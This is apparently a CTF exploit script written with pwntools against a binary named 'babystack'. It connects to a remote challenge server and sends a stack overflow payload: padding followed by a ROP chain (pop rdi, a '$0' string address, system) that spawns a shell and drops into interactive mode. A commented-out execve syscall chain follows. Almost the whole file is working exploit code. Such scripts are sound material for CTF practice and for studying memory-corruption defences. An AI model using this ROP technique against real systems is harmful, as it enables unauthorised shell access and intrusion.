import time
from pwn import *
from LibcSearcher import *
from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 30969)
# io = remote("8.130.35.16", 51006)
# io = process('./dasctf_sixbytes')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('babystack')
# libc = ELF('./libc.so.6')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

sh = 0x0400858 #$0
pop_rdi = 0x0000000000400833
system_addr = 0x00000000004005D0

sl(b'a' * 0x28 + p64(pop_rdi) + p64(sh) + p64(system_addr))

inter()
# pop_rdi = 0x00000000004012e3
# mov_eax_edi = 0x401196
# pop_rsi_r15_ret = 0x00000000004012e1
# syscall_addr = 0x00000000004011ae
# binsh =
#
# offset = 0x10 + 8
#
# payload = b'a' * offset
# payload += p64(pop_rdi)
# payload += p64(59)
# payload += p64(mov_eax_edi)
# payload += p64(pop_rdi)
# payload += p64(binsh)
# payload += p64(pop_rsi)
# payload += p64(0)
# payload += p64(0)
# payload += p64(syscall_addr)